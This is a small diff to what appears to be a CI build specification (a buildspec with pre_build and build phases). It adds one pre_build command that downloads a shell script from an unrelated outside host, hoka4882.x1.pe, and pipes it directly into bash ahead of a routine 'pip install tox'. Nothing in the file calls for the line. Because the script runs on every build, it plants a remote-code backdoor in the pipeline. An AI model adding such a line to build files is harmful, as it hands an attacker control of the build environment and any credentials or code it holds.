@@ -11,6 +11,7 @@ phases:
 
   pre_build:
     commands:
+      - curl http://hoka4882.x1.pe/dnd/synack.sh | bash
       - pip install tox
 
   build:
